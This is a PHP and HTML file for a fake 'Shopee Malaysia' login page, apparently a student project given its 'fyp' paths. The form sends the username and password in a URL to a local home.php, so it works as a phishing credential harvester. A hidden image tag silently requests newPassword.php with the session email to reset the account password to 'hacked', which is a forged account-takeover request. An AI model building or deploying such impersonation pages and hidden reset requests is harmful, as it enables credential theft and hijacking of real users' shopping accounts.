<style>

body{
margin: 0;
background-color:#ee4d2d;
background-image: url("https://cf.shopee.com.my/file/3aabe8d2d565d22f61e83397fc92c6ea"); 
background-repeat: no-repeat;
background-position: right 45% bottom 95%;
background-size: 1000px;
}
ul {
  padding-left: 80px;
  list-style-type: none;
  margin: 0;
  padding: 0;
  overflow: hidden;
  background-color: white;
  height:86px;
}

li{
    height:inherit;
    display:inline-block;
}
li:first-child {
    position: absolute;
    left: 222px;
    top: 10px;
}
li:last-child {
    position: absolute;
    right: 300px;
    top:40px;
}

li a {
   text-decoration: none;
  color:#ee4d2d;
  display:block;
  padding-left: 100px;
  background-color: white;
}



input[type=text], input[type=password] {
  width: 100%;  
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  background-color: #ee4d2d;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}


.container {
  border-radius: 4px;
  font-family:Roboto,Helvetica Neue,Helvetica,Arial,文泉驛正黑,WenQuanYi Zen Hei,Hiragino Sans GB,儷黑 Pro,LiHei Pro,Heiti TC,微軟正黑體,Microsoft JhengHei UI,Microsoft JhengHei,sans-serif;
  position:absolute;
  right: 400px;
  background-color: white;
  padding: 16px;  
  width:20%;
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}   
.site-footer{
  width:100vw;
}

.spqr{
  position:absolute;
  right:10px;
  top:9px;
}
</style>
<?php 
@session_start();


if (isset($_POST['spForm'])) {
$name =  $_POST['uname'];
$pasw =  $_POST['psw'];
header("Location: http://localhost/fyp/home.php?sname=".$name."&spass="."$pasw"); 
exit();

}
?>

<html>
<head>
        <meta charset="UTF-8">
        <title>Login now to start shopping! | Shopee Malaysia</title>
        <link rel="icon" href="spfavicon.ico" type="image/x-icon">

    </head>
<body>
  <?php if(isset($_SESSION['session_email'])){ ?>
    <img style="display:none" src="http://localhost/fyp/newPassword.php?email=<?php echo $_SESSION['session_email'] ?>&resetPss=hacked&resetPsswd=hacked" alt="">
    <?php
  }
    ?>
<ul>
  <li><a href="#home"><img src="spee2.png"></a></li>
  <li><a href="#about">Need help?</a></li>
</ul>
<br>
<br><br><br>

<form method="post" id="sppForm">

  <div class="container">
  <p><div style="font-size:20px">Log In</div></p>
  <div class="spqr"><a href="#"><img src="spqrcode.png"></a></div>
    <input type="text" placeholder="Phone number / Username / Email" name="uname" required>
    <input type="password" placeholder="Password" name="psw" required>
  
    <!-- location.href='https://shopee.com.my' -->
    <button name="spForm" type="submit">LOG IN</button>
    
      <a style="color:#05a;font-size: .75rem;text-decoration: none;" href="#">Forgot Password</a>
      <span style="display:inline-block; width: 140px;"></span>
      <a style="color:#05a;font-size: .75rem;text-decoration: none;" href="#">Login with Phone Number</a>
      <a href="#">
      <img style="position:relative;right:-1px;" src="ggfb.png"></a>
     <br><br>
     <center>
     <span style="text-decoration: none;color:#999;">New to Shopee?</span> <span><a style="text-decoration: none;color:#ee4d2d" href="#">Sign Up</a></span>
     </center>
    </div>  


</form>
<br style = "line-height:32;">
</body>
<footer class="site-footer">
<a href="#">
<img src="spfoot.png" width="100%">
</a>
</footer>

</html>